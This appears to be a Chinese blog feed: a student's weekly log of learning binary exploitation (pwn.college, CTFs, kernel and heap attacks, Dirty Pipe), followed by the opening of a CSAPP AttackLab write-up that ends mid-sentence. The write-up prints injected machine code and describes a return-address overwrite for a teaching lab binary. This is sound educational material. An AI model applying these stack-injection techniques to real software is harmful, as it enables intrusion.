gcc编译选项:<code>-masm=intel</code>gdb选项:<code>set disassembly-flavor intel</code> | 找到了所有的视频</li></ul><h3 id="第三十九周-4-4-4-10"><a href="#第三十九周-4-4-4-10" class="headerlink" title="第三十九周: 4/4-4/10"></a>第三十九周: 4/4-4/10</h3><ul><li>4: <a href="https://stackoverflow.com/questions/2529185/what-are-cfi-directives-in-gnu-assembler-gas-used-for">CFI directives</a>&amp;<a href="https://stackoverflow.com/questions/38552116/how-to-remove-noise-from-gcc-clang-assembly-output">complier option</a> | 看视频中, 没找到想要的</li><li>5: <a href="https://www.baeldung.com/linux/posix">guide to POSIX</a>&amp;<a href="https://pubs.opengroup.org/onlinepubs/9699919799/nframe.html">full doc</a> | pwn.babyjail to 10 | <a href="https://unix.stackexchange.com/questions/515881/what-does-the-ep-capability-mean">StackOverflow上的capability(ies)</a>, man上也有, 是chroot权限的背后原因 </li><li>6-7: bash的手册也得看下, 操作好多, 主要是shell语言的规则. 第二天bomblab重做(32位的…….)</li><li>8-10:  gdb refresher</li></ul><h3 id="第四十周-4-11-4-17"><a href="#第四十周-4-11-4-17" class="headerlink" title="第四十周: 4/11-4/17"></a>第四十周: 4/11-4/17</h3><ul><li>11: 没做啥</li><li>12 13: <a href="https://unix.stackexchange.com/questions/6155/can-i-easily-search-my-history-across-many-screen-windows">history in screen</a> | make的语法也太多了…….要对文档PTSD了 | 13看了点计网小班.浪费时间的东西.</li><li>14: reverse engineering…. 我真的认真的只看汇编, 但是一想也没必要, 都用IDA pro了. 然后下载了pwnsh, 加上三个gdb插件安装脚本, 再熟悉了一下IDA的界面, 然后写个python脚本东查查西查查(list comprehension), 最后看了看视频, 知道了gdb调试set-uid的程序不能成功derandomize以及IDA添加struct类型等等来完善decompiled code, 用了<strong>整个</strong>下午和晚上. 好像是学了点东西…..</li><li>15-17: reverse !<br>IDA的<a href="https://eviatargerzi.medium.com/remote-debugging-with-ida-from-windows-to-linux-4a98d7095215">远程gdb</a> | pluginlist(一时半会儿用不到,先star)</li></ul><h3 id="第四十一-二周-4-18-5-1"><a href="#第四十一-二周-4-18-5-1" class="headerlink" title="第四十一/二周: 4/18-5/1"></a>第四十一/二周: 4/18-5/1</h3><ul><li>18满课(…)19做了一点20-22<u>IDA debug</u>| reverse engineering</li><li>23: memory error, 弄了pwndbg的多视图和tmux. 比screen好用, 还能整鼠标(</li><li>26: 继续memory error, 7做到12</li><li>27: 视频里真有一些没见过的用法….要不要花时间看呢?</li><li>剩下几天做到了exploitation的第7题. </li></ul><h3 id="第四十二周-5-2-5-8"><a href="#第四十二周-5-2-5-8" class="headerlink" title="第四十二周: 5/2-5/8"></a>第四十二周: 5/2-5/8</h3><ul><li>3: exp的第七题开始Yan85, 回顾了一下rev的18+19.</li><li>4-5: 过了一遍mem, 看了rop视频, 在整heap.</li><li>6-7: 在整rop. 还是有以前那几道ctf题里没见过的东西, 毕竟这课程会更系统一点.<br><a href="https://bbs.pediy.com/thread-254868-1.htm">不同版本libc使用</a> | </li><li>8:rop. 打算看两眼ROPgadget的实现, 了解一下python项目. <ul><li>试了下gdb的record和reverse exec.</li></ul></li></ul><h3 id="第四十三周-5-9-5-15"><a href="#第四十三周-5-9-5-15" class="headerlink" title="第四十三周: 5/9-5/15"></a>第四十三周: 5/9-5/15</h3><ul><li>9-10: rop</li><li>11-12: race condition</li><li>13: race + 补一下<strong>shell programming</strong>(详见linux使用), 都查到了POSIX的标准了.</li><li>14-15: race, level1测试+shell编写, 结果level5直接卡住过不了. 下周看视频去了.<ul><li>………………….感觉还是得用python, 没有用shell的. os模块挺多函数. 不过shell看了下也不亏(大概)</li></ul></li></ul><h3 id="第四十四周-5-16-5-22"><a href="#第四十四周-5-16-5-22" class="headerlink" title="第四十四周: 5/16-5/22"></a>第四十四周: 5/16-5/22</h3><ul><li>16-17: race到8, 17号看office hour中的level8 socket, 感觉前面的socket相关都跳过了不太好…..</li><li>18: 写了python的并行. vim安装了点插件.</li><li>19: 继续race | pthread锁 |  awk语言<ul><li>又不明所以地做完了level9, level10一个绕过semaphore又整不会了, 看视频去了.</li></ul></li><li>20: race完成+kernel一点视频</li><li>21: LibcSearcher和python包安装更新,整理root文件夹 | pwn_kernel环境搭建+视频 | 看linux inside syscall part1 | </li><li>22: pwnkernel, 内容很多.<br><a href="https://www.kernel.org/doc/man-pages/">online manpage</a> | </li></ul><h3 id="第四十五周-5-23-5-29"><a href="#第四十五周-5-23-5-29" class="headerlink" title="第四十五周: 5/23-5/29"></a>第四十五周: 5/23-5/29</h3><ul><li>23: kernel vedio + online challenge usage</li><li>24: kernel challenge to 6(half complete)</li><li>25: Computer Network Lab5: root dns server on local machine. + 计系小班</li><li>26-27: kernel大概做完了 | 了解一下CTFtime上的东西.</li><li>28: 愚蠢的验收浪费一天时间. 本科像是个笑话</li><li>29: advanced, vedio+note.</li></ul><h3 id="第四十六周-5-30-6-5"><a href="#第四十六周-5-30-6-5" class="headerlink" title="第四十六周: 5/30-6/5"></a>第四十六周: 5/30-6/5</h3><ul><li>30: <p hidden>我焯,  改变策略, 全力保研, 居然能在分流后保研边缘, 马上开始内卷.</p> </li><li>31-5: 复习+一点点advance.</li></ul><h3 id="第四十七周-6-6-6-12"><a href="#第四十七周-6-6-6-12" class="headerlink" title="第四十七周: 6/6-6/12"></a>第四十七周: 6/6-6/12</h3><ul><li>6-7: 复习周.</li></ul><h2 id="开始暑假"><a href="#开始暑假" class="headerlink" title="开始暑假"></a>开始暑假</h2><p>重新计数, 因为大二结束了(小学期不是个东西, 所以不算)</p><h3 id="第一周-6-13-6-19"><a href="#第一周-6-13-6-19" class="headerlink" title="第一周: 6/13-6/19"></a>第一周: 6/13-6/19</h3><ul><li>13-16: 期末考试</li><li>17: 重新看最后一章</li><li>18: 发现代码中还是有很多细节, 仔细分析视频中, 并且对代码做了一点小修改.</li><li>19: 在kali2021上的libc2.33中(比2.31多了tcache对齐检查和地址保护)实现了任意读写原语构造, 完全理解了示例代码中的每一行的操作. 不过在context.binary忘加上这里卡了挺久…….仍然在level1.<br>scanf 和 printf 的空字节读写问题 | tcache poisoning.</li></ul><h3 id="第二周-6-20-6-26"><a href="#第二周-6-20-6-26" class="headerlink" title="第二周: 6/20-6/26"></a>第二周: 6/20-6/26</h3><ul><li>20-23: 一些advance和小学期.</li><li>24-26: 算是学完了pwn.college, 然后整点单片机编程, 再然后开整CTF</li></ul><h3 id="第三周-6-27-7-3"><a href="#第三周-6-27-7-3" class="headerlink" title="第三周: 6/27-7/3"></a>第三周: 6/27-7/3</h3><ul><li>27-3: 单片机编程 + git的进阶使用(vscode GitLen+ Git CLI)<br>写代码有点上头, xyw整了个离谱玩意儿我打算这两天看看.</li></ul><h3 id="第四周-7-4-7-10"><a href="#第四周-7-4-7-10" class="headerlink" title="第四周: 7/4-7/10"></a>第四周: 7/4-7/10</h3><ul><li>4-6: 完善倒计时单片机, 顺带熟悉了一下git的各种功能.</li><li>7: docker在ubuntu上的安装使用(最后也没整成, Desktop装不上或者设置打不开, 还是放弃了.)<br><a href="https://www.redhat.com/en/topics/api/what-is-a-rest-api">RESTful API</a> | 装了个Ubuntu22.04 | 双系统整不明白,不装了<br>明天继续docker命令熟悉(没了图形界面只能继续学命令行了)</li><li>其余: docker compose syntax | xinetd(which means deamon) | <code>.d</code>directory name |<br>Firmware, a special class of computer software used to control low-level hardware(like BIOS), held in non-volatile mem |<br>升级了一下虚拟机硬件兼容性, 现在kali支持了KVM |  </li></ul><h3 id="第五周-7-11-7-17"><a href="#第五周-7-11-7-17" class="headerlink" title="第五周: 7/11-7/17"></a>第五周: 7/11-7/17</h3><ul><li>11: 又往单片机编程项目里加了点东西, 倒计时更完善(<del>大杂烩</del>)了</li><li>12: kernel module programming | device.h都不知道在哪里,搜都搜不到哪里下载 | </li><li>13: 继续 | 看了xyw的STC-OS | </li><li>14: 弄明白90%的STC-OS | vim | CTF-WiKi in kernel</li><li>15: kernel | ???</li><li>16: kernel ROP(环境部分) 遇到了一点问题, 两个小时解决了.</li><li>17: 继续ROP(代码部分) 修改python库代码<a href="https://stackoverflow.com/questions/72659999">错误</a> </li></ul><h3 id="第六周-7-18-7-24"><a href="#第六周-7-18-7-24" class="headerlink" title="第六周: 7/18-7/24"></a>第六周: 7/18-7/24</h3><ul><li>18: ret2user代码, <p hidden>回龙岩一趟, 没学多少.<p> </li><li>19: strtol()到类型指定长度就会停下 | 调试</li><li>20: 继续WiKi | MSR和gs/fs相关内容, 写在new_start里面 | </li><li>21: 用<code>svn checkout [/trunk]</code>下载相应子文件夹 | 继续bypass smep | 把extract移动到bin下</li><li>22: 查Intel手册, Double fetch</li><li>23: fetch + userfaultfd, 看了半天的constgrep源码, 居然只是硬编码的宏定义. 还是用lookup_constants了.<p hidden>饥荒+Clannad</p> </li><li>24: ????????????????????????????<p hidden>全是饥荒</p> </li></ul><h3 id="第七周-7-25-7-31"><a href="#第七周-7-25-7-31" class="headerlink" title="第七周: 7/25-7/31"></a>第七周: 7/25-7/31</h3><ul><li>25: 涉及到内核的macro好难查出来 | userfaultfd | </li><li>26: kernel 收尾 | IO_FILE </li><li>28:  复习堆利用的各种技巧. </li><li>29: <div hidden>没得学了…..问skr去了 | 开了一天车</div> …</li><li>30: 复习heap利用.</li><li>31: 继续 | <a href="https://refspecs.linuxfoundation.org/">linux specifications</a> | <a href="https://refspecs.linuxfoundation.org/lsb.shtml">LSB standard</a> | HOOK</li></ul><h3 id="第八周-8-1-8-7"><a href="#第八周-8-1-8-7" class="headerlink" title="第八周: 8/1-8/7"></a>第八周: 8/1-8/7</h3><ul><li>1: libc多版本(使用glibc-all-in-one) | 添加了chlibc到/bin中.</li><li>2-3: large bin attack | Tcache</li><li>7: heap</li></ul><h3 id="第九-十周-8-8-8-21"><a href="#第九-十周-8-8-8-21" class="headerlink" title="第九/十周: 8/8-8/21"></a>第九/十周: 8/8-8/21</h3><ul><li>8: off-one-byte </li><li>9-10: b00ks</li><li>15: 终于看完了heapstrom2. </li><li>18: pylance <a href="https://stackoverflow.com/questions/65252074#answer-67070096">添加</a>import路径 </li><li>19: 看ret2dlresolve</li></ul><h3 id="第十一周-8-22-8-28"><a href="#第十一周-8-22-8-28" class="headerlink" title="第十一周: 8/22-8/28"></a>第十一周: 8/22-8/28</h3><ul><li>21: 小学期报告</li><li>22-26: 小学期+ret2dlresolve+链接装载与库</li><li>27-28: 32位</li></ul><h3 id="第十二周-8-29-9-4"><a href="#第十二周-8-29-9-4" class="headerlink" title="第十二周: 8/29-9/4"></a>第十二周: 8/29-9/4</h3><ul><li>29-30: 整理关于ELF动态链接的知识点</li><li>31-1: 继续整理加上32位情况下的exp的写</li><li>2: 32位partial的exp</li></ul><h2 id="大三第一学期"><a href="#大三第一学期" class="headerlink" title="大三第一学期"></a>大三第一学期</h2><h3 id="第十三周-9-5-9-11"><a href="#第十三周-9-5-9-11" class="headerlink" title="第十三周: 9/5-9/11"></a>第十三周: 9/5-9/11</h3><ul><li>3-4: 64位no RELRO的exp, 遇到一堆问题. 总算解决了. 4号下午整了vscode和chrome安装路径, 删掉旧版.</li><li>怎么学的这么慢?</li><li>5: 64 partial RELRO</li><li>6: 64的终于完成了…… 不过并没有Wiki上说的那么多问题, 只有system对齐和伪造表的地址和栈空间的问题</li><li>7-8: 7号没干啥, 上课. 8号 HITCON CTF 2020 START!!</li><li>9: 看了看revenge of pwn, 还要研究pwntools的源码, 真不愧是misc类. 看一半转到kernel题Spark.</li><li>10: 看懵了. 在IDA里分析ko的反汇编….. </li><li>11: qiyz_ssyahu</li></ul><h3 id="第十四周-9-12-9-18"><a href="#第十四周-9-12-9-18" class="headerlink" title="第十四周: 9/12-9/18"></a>第十四周: 9/12-9/18</h3><ul><li>12: 属于是只能照着wp来理解一下到底怎么做题的….. 还没整完Spark. 恢复ko文件里的类型信息都给累死. </li><li>13: 调试spark <p hidden>不会吧一道题要看这么多天???</p>  终于完全恢复了ko文件的类型信息. 搞明白了流程. 这几个结构体真是可以从零开始猜测的? </li><li>14: 这exp复杂程度又是第一次见了…. 四百多行, 用了userfaultfd+setxattr. 还没看呢.<br>感觉可以每天看下how linux works. </li><li>15: 看的内容同昨日</li><li>16-18: 看书</li></ul><h3 id="第十五周-9-19-9-25"><a href="#第十五周-9-19-9-25" class="headerlink" title="第十五周: 9/19-9/25"></a>第十五周: 9/19-9/25</h3><ul><li>…<p hidden>效率过低了吧…..周六浪费一天,睡了好久又玩游戏,这玩意儿真特么停不下来</p></li><li>19-20: linux那本书. </li><li>还搁这spark.</li><li>.<p hidden>第十六周: 9/26-10/2  不好评价</p></li></ul><h3 id="第十七周-10-3-10-9"><a href="#第十七周-10-3-10-9" class="headerlink" title="第十七周: 10/3-10/9"></a>第十七周: 10/3-10/9</h3><ul><li>345: 看完了spark. 进度最慢的一段时间. </li><li>6: 昨晚问了skr, 我决定加入r3kapig战队. 没想到都不用面试直接进的. 然后发现CSR CTF马上要开始了, 看了看往年的题目.</li><li>7: 看不懂, 居然还有以太坊的题目, 不过顺带看看以太坊是个啥. </li><li>8-9: 还是注册了一个队伍, 不过只做出来了签到题….这CSR综合度太高了, 到处都是知识盲区, 不是传统PWN方向的题目. </li></ul><h3 id="第十八周-10-10-10-16"><a href="#第十八周-10-10-10-16" class="headerlink" title="第十八周: 10/10-10/16"></a>第十八周: 10/10-10/16</h3><ul><li>10: 看了看ASIS CTF的往年题目, 决定参加下周六的比赛试试….这次是有传统pwn题的, 好像无内核题目. </li><li>11: 到了难度2/4的题目, 短短几十行却看不出有什么问题….</li><li>12-16: 做完了strvec, 才想起来tcache就是heap前面那个0x290的chunk. 顺带体验了一下ASIS CTF 2022, 结果签到题都看半天, 第一个直接用了非预期解, 第二个都忘了%n$这个操作.<br>顺带继续做完ASIS2021的pwn题, 顺便体验一下rev的题目.<br>下一个打算做做sekai ctf的题目, 官方自带wp, 爱了, 就做个两年份的, 顺带看看其他类别的题目长长见识.<br>见到了forensics &amp; ppc类别的题目. </li></ul><h3 id="第十九周-10-17-10-23"><a href="#第十九周-10-17-10-23" class="headerlink" title="第十九周: 10/17-10/23"></a>第十九周: 10/17-10/23</h3><ul><li>17-18: 这两天都是readable的exp学习, 顺带如何使用提供的docker环境和部署脚本, 知道了其中一种非预期解, 但是没有跑通, 另一种队里的非预期解没懂, 还有预期解还需要看. 预计又要看个一周了, 学校还有一些其他的事情. </li><li>19: 预期解+x32_abi解. </li><li>20: x32abit听说ubuntu18可用 | 继续intended solution. </li><li>21: 完成, 看了两眼babyscan, 原来是格式化字符串的内容, 差点忘了. 看了看jsy. </li><li>22: 继续jsy. 没看两眼发现hackergame开了, 不出所料的没会几题, web math基本直接放弃. </li><li>23: 看namespace. man page真的多, 但是全. </li></ul><h3 id="第二十周-10-24-10-30"><a href="#第二十周-10-24-10-30" class="headerlink" title="第二十周: 10/24-10/30"></a>第二十周: 10/24-10/30</h3><ul><li>24: (user)<a href="https://blog.quarkslab.com/digging-into-linux-namespaces-part-2.html">namespace</a> + capabilities, 手册的东西真的多. </li><li>25-26: 还看了credentials等等. 在题目那里整理了一下. 还是靠wp吧. </li><li>27: 看rust, 准备入个rust-pwn的小门. </li><li>28: rust</li><li>29: 看了下hack.lu. 午夜开的比赛, 一觉醒来pwn题都没几个解出来的. 估计我也解不出来.<br>烦的要命, kali的dpkg不支持zst压缩, 也不知道怎么在debian上弄2.34glibc, 为了运行程序只能转到ubuntu, dpkg是可以的.<br>不过还要装proxychain patchelf chekcsec等等等真实够麻烦. sudo也打不习惯. 好的环境搭不起来再见hacklu.</li><li>30: 研究placemat的汇编层面c++ class, 当做复习了一下类继承虚表啥的. 又是啥都没做出来的一次比赛. </li></ul><h3 id="第二十一周-10-31-11-6"><a href="#第二十一周-10-31-11-6" class="headerlink" title="第二十一周: 10/31-11/6"></a>第二十一周: 10/31-11/6</h3><ul><li>31: hacklu讨论里有各题wp, 还不错又得看个几天了. </li><li>1: 都在看placemat, 主要是c++的各种东西, 当然还有printf这种简单但又复杂的函数…………..</li><li>2-6: C++ ABI 周末运动会.<br>我居然看了这么多天</li></ul><h3 id="第二十二周-11-7-11-13"><a href="#第二十二周-11-7-11-13" class="headerlink" title="第二十二周: 11/7-11/13"></a>第二十二周: 11/7-11/13</h3><ul><li>7: 没做啥 <p hidden>在pdd淘宝京东磨蹭买跑步裤子</p> </li><li>8: 终于搞定placemat. 全凭自己弄了. 看看riot. </li><li>9: dirtypipe环境搭建, 整半天linux编译, 打了两个patch才能用. </li><li>10: 继续dirtypipe. 看了看cm4all team的关于如何发现该漏洞的blog.</li><li>11-13: 继续dirtypipe. </li></ul><h3 id="第二十三周-11-14-11-20"><a href="#第二十三周-11-14-11-20" class="headerlink" title="第二十三周: 11/14-11/20"></a>第二十三周: 11/14-11/20</h3><ul><li>14: 做完了dirtypipe的ppt, 主要是思考如何讲解. 除了原理还读了发现者的blog, 看了下是怎么发现的, 看了一堆东西比如zip zlib. 又看了几个exp实践了一下, 加上看到了x32 abi的编译选项解决了ASIS2022 readable的一种方法. 挺花时间的, 不过还算看了不少东西.<br>看ordersystem, <strong>麻烦记得有问题先重启</strong> </li><li>15: 看ordersystem, 涉及到了反弹shell, 即reverse shell. 又开始看python bytecode. </li><li>16: 继续字节码. <a href="https://realpython.com/inner-functions-what-are-they-good-for/">python nested function</a> | </li><li>17: 又想开始复习一下编译原理了, 诶时间不太够 | <a href="https://stackoverflow.com/questions/1301346#answer-59066258">underscore in python</a> </li><li>18: 整了点学校里没用的实验报告, 不过倒是看了一些路由器命令行配置 | 继续bytecode</li><li>19-20: 没啥变化, 还真的看了一个星期啊. <p hidden>周六社团, 开摆了一天, 看七个小时手机玩一晚上游戏, 绝了</p><br>一知半解总是令人难受, 决定看完cpython的所有流程. </li></ul><h3 id="第二十四周-11-21-11-27"><a href="#第二十四周-11-21-11-27" class="headerlink" title="第二十四周: 11/21-11/27"></a>第二十四周: 11/21-11/27</h3><ul><li>21: python internal</li><li>22: 找了半天没看到啥有用的, rst插件全都出错, 什么sys.exc_info()放在with语句里也不知道做啥的, 把3.11源码弄成本地repo然后寻找call_method&amp;load_method. 折腾一大圈, 不如看看<code>test_test()</code>的dis结果, , , , ,</li><li>23: 转了一大圈, 重新来看手写的bytecode, 终于全弄明白里面每一步操作了, 接下来是复现 </li><li>24: python decorator用法:<a href="https://www.geeksforgeeks.org/decorators-in-python/">geeks</a>/<a href="https://docs.python.org/3.11/reference/compound_stmts.html#function-definitions">pydoc_func</a> | functiontools.partial | what is <a href="https://stackoverflow.com/questions/6476825/what-do-double-parentheses-mean-in-a-function-call-e-g-funcfoobar">func(foo)(bar)</a><br>看了看pwncli的用法, 虽然好用但是又是一个学习成本负担, 我已经处在学习速度跟不上用的速度的状态了. 周末还有hitcon ctf, 这种难度我多半又是队里陪跑. 哎hack.lu的题还要看完吗?还有之前的seccon ctf还没看呢. </li><li>25: 忙着复现, 自己写的时候又是一堆问题 <ul><li>在windows上装了pwntools, 感觉应该不太能用吧…待研究. </li><li>又是sendline被识别成noreturn, 手动在sendraw中加入return </li><li>hitcon直接出来些vm escape, browser之类的题目. 完全没看过啊喂 </li></ul></li><li>26: 还tm的是复现<ul><li>看到群里有人说userfaultfd有个类似的技术叫做FUSE. 得, 又是个没见过的东西. 搜一下.  <strong>L</strong>ocal <strong>P</strong>rivilege <strong>E</strong>scalation (LPE)</li><li>成功了. 我逐渐理解了一切. </li></ul></li><li>27: 为了hacklu的byor又继续开始<a href="https://www.roderickchan.cn/post/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/">house of apple</a>. 又是一个大坑, FSOP都还没看. seccon也没看, hitcon更没看, sekai不知道啥时能看. 先不看了. <ul><li>去了下信安协会, 在考虑我真的想做研究么? 可能也不是很想做. 现在也该做些real-world的东西了, ctf题目真是一群职业老手搞出来玩玩的东西, 我一下做这种世界范围的比赛还是难顶, 而且每一个题目的方向的小入门都能看一两个星期. </li></ul></li></ul><h3 id="第二十五周-11-28-12-4"><a href="#第二十五周-11-28-12-4" class="headerlink" title="第二十五周: 11/28-12/4"></a>第二十五周: 11/28-12/4</h3><ul><li>28: 迷茫中, 正在复习编译原理打算继续学中间代码优化和插桩. cs143的笔记写得也太简洁了, 重看的时候基本和没有一样. 幸好还是记得大概的流程的. </li><li>29: 复习, 补充笔记. 解决了typora和vscode<a href="https://github.com/microsoft/vscode/issues/146381">由于gpu加速导致的显示模糊</a>–参数加上<code>--disable-gpu</code>. </li><li>30-1: 没啥特别的. 整了点学校的无聊报告. </li><li>2: 整报告 |  <code>$@ $*</code>的<a href="https://stackoverflow.com/questions/22589032">区别</a> | </li><li>3-4: 复习补充完了, 4号晚上开始CSCD70 </li></ul><h3 id="第二十六周-12-5-12-11"><a href="#第二十六周-12-5-12-11" class="headerlink" title="第二十六周: 12/5-12/11"></a>第二十六周: 12/5-12/11</h3><ul><li>5: <del>llvm. 一个环境起不来, ubuntu docker莫名抽风, kali没法apt llvm-12. 我: ?????</del> 发现只是docker context的问题.</li><li>6: 纠结中. 没东西学让我很焦虑, 最直接的是在这里写不了一行字. 随便看点PE的格式和qemu逃逸(包括明天). </li><li>7: ?</li><li>8-9: 看点llvm加上qemu逃逸</li><li>10: RCTF看两眼(只会看两眼, traits直接又劝退了) + modern C++这书可以看看, <del>因为一个allocator又去查资料了.</del> 好吧和allocator无关.<br>已经在马不停蹄的学C++20 qemu逃逸 rust了, 还有fuzz和一堆不知道其存在的技术<br>modern C++有空就看一点吧…. 有点学累了, 学不完主要是, 还没什么成果. 下周去实习看看吧, 看起来怎么就一个星期..?</li><li>11: 呃, 看了点qemu</li></ul><h3 id="第二十七周-12-12-12-18"><a href="#第二十七周-12-12-12-18" class="headerlink" title="第二十七周: 12/12-12/18"></a>第二十七周: 12/12-12/18</h3><ul><li><p>12-14: 实习. 看书加上帮点小忙. <p hidden>啥流程都属于保密范围, 只能写写那本书上的东西</p> </p><div class="hljs code-wrapper"><pre><code>装了pdf xchange editor, 换掉了xodo这个奇葩玩意儿. 天天给我整黑屏. 然后装装虚拟机, 搞定了32/64位软件版本问题(52pojiexp上直接就是32位的), 然后自己试试分析真实程序. ctf还是太玄乎了. 发现的问题还是写在malware-analysis里面. </code></pre></div></li><li><p>15-17: 都在看书, 简单的看了一遍. 六百页的书直接过了一遍. </p></li><li><p hidden>...赶在第一波阳了, 舍友你干的好啊</p></li></ul><h3 id="第二十八九周-12-19-1-1"><a href="#第二十八九周-12-19-1-1" class="headerlink" title="第二十八九周: 12/19-1/1"></a>第二十八九周: 12/19-1/1</h3><ul><li>19-21: 宿舍颓废中</li><li>22-25: 快恢复了但是意外的没动力学. 真是罕见. </li><li>26-31: ?</li><li>1: 看了看ASIS Final, 不出意料的没啥帮助, 想了想还是回顾下RCTF的C++ Reverse.</li></ul><h3 id="第三十一周-1-2-1-15"><a href="#第三十一周-1-2-1-15" class="headerlink" title="第三十一周: 1/2-1/15"></a>第三十一周: 1/2-1/15</h3><ul><li>2: 看C++. 感觉cppreference上的可以过一下. 这个时候又回想起来modern cpp了, 赶紧捡起来一起看看.</li><li>3-4: Diary C++逆向. 看了下某位一开始就学过的SGI STL, 稍微看两眼也不是完全不懂. 自己写两下代码对照着复现下C++源码.</li><li>5-12: </li><li>15:  ? <p hidden>玩了死亡搁浅 像素工厂 坎巴拉, 然后顿悟游戏只是浪费时间, 全都卸载了</p> </li></ul><h3 id="第三十二三周-1-16-1-29"><a href="#第三十二三周-1-16-1-29" class="headerlink" title="第三十二三周: 1/16-1/29"></a>第三十二三周: 1/16-1/29</h3><ul><li>19: 看完了Diary, 慢得离谱.</li><li>20: BFC, 又是C++逆向. 去年除夕夜在看计网, 今年除夕夜也得看点啥才行. 说不定就成我的惯例了呢(wwwwww)</li><li>21: 除夕夜在看STL源码剖析, 不错. </li><li>22: 看了点书, 到P113</li><li>23-24: 看书</li><li>25: 看红黑树和map的源码. </li><li>29: 做bffc又见C++ ABI. </li></ul><h3 id="第三十四周-1-30-2-5"><a href="#第三十四周-1-30-2-5" class="headerlink" title="第三十四周: 1/30-2/5"></a>第三十四周: 1/30-2/5</h3><ul><li>3031: 搞不明白暂时没整house of apple. 看看GAME. </li><li>1-3: 看GAME中, 东查西查折腾半天没看明白. 还被gef抽风整傻了(一个多小时). <ul><li><a href="https://unix.stackexchange.com/questions/197225/is-vmlinuz-and-bzimage-really-the-same">vmlinuz &amp;&amp; bzImage</a> </li><li>看了一位带佬的博客只能感叹又全又清晰, 自己的kernel pwn分散在各个post就相形见绌了. 诶不整理也凑合吧. </li></ul></li><li>4: 继续GAME. 查了挺久的东西, tag类函数连文档都没有….</li><li>5: 看完了GAME. 可以整整常用include. kernel题目还是有很多实现我没有整理过. 可能还要开好几篇文章. gef和pwndbg感觉也升级了一些功能, 还没来得及看看. pwndbg用顺了. 换一个挺麻烦. 更新感觉很nice, 果然要定期瞧瞧. </li></ul><h3 id="第三十五周-2-6-2-12"><a href="#第三十五周-2-6-2-12" class="headerlink" title="第三十五周: 2/6-2/12"></a>第三十五周: 2/6-2/12</h3><ul><li>6: 整理下笔记, 主要是kernel pwn. </li><li>7: 继续整理</li><li>8: 仍然是. 补完了slab allocator是个啥. CTF-wiki上啥也没提我现在才知道这东西. 好久都没人更新了. 发现内存管理还有好多可看的. 有时间瞧瞧. </li><li>9: 看书, linux的一些操作. </li><li>10: 没干啥, 看了两页. </li><li>11: 看博客, 电脑清灰+32G内存 </li><li>12: 看modern C++和linux内存管理.<br>-rc in linux version is <em>Kernel release candidates</em> </li></ul><h3 id="第三十六周-2-13-2-19"><a href="#第三十六周-2-13-2-19" class="headerlink" title="第三十六周: 2/13-2/19"></a>第三十六周: 2/13-2/19</h3><ul><li>13-15: 看cpp新标准. </li><li>16: 看看肖佬的idekCTF2022 <a href="https://kiprey.github.io/2023/01/idek_coroutine/">Coroutine</a>.</li><li>17-18: 继续看</li><li>19: 开了两个CTF, js wasm risc-v全都不熟, 又是围观的一天. </li></ul><h3 id="第三十七周-2-20-2-26"><a href="#第三十七周-2-20-2-26" class="headerlink" title="第三十七周: 2/20-2/26"></a>第三十七周: 2/20-2/26</h3><ul><li>20: </li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>schedule</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP_Lab</title>
    <link href="/2021-05/Archive-CSAPP-Lab/"/>
    <url>/2021-05/Archive-CSAPP-Lab/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-LAB"><a href="#CSAPP-LAB" class="headerlink" title="CSAPP_LAB"></a>CSAPP_LAB</h1><h2 id="AttackLab"><a href="#AttackLab" class="headerlink" title="AttackLab"></a>AttackLab</h2><blockquote><p>要会使用hex2raw和ctarget和rtarget, 用管道符号比较方便. </p></blockquote><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase 1"></a>phase 1</h3><p>直接使用溢出的8字节改写为touch1的地址</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase 2"></a>phase 2</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">touch2</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> val)</span></span>&#123;<br>    vlevel = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (val == cookie)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        validate(<span class="hljs-number">2</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        fail(<span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">0:48 c7 c7 fa 97 b9 59  mov    $0x59b997fa,%rdi<br>9:68 ec 17 40 00       pushq  $0x4017ec<br>e:c3                   retq   <br></code></pre></div></td></tr></table></figure><p>此阶段需要执行栈上的代码, 在缓冲区里填充所写的代码后, 用gdb获得buf的栈顶, 覆盖getbuf的返回地址即可</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase 3"></a>phase 3</h3><p>touch3函数里调用了hexmatch(cookie, sval), sval是char*类型且为touch3的第一个变量, 作用是比较字符串sval和cookie是否相同, 所以在调用touch3之前需要将%rdi设置为cookie的字符串形式, 即ASCII码值, 程序的大致运行过程如下:</p><ol><li><p>test=&gt;getbuf, 40字节的栈空间存放攻击代码, 内容为: 设置%rdi, 将touch3地址推到栈上, ret. 溢出的8字节为getbuf返回地址, 改写为攻击代码的首地址.</p><img src="../../image/CSAPP_Lab/afaadcb0e4f822d9c3f9a27ca83b01bf.png" alt="img" style="zoom:67%;" /></li><li><p>首地址获取方法: 用gdb调试设置断点到getbuf, 找到%rsp减去40后的值, 即为攻击代码地址</p></li><li><p>设置%rdi还要注意hexmatch的随机函数, 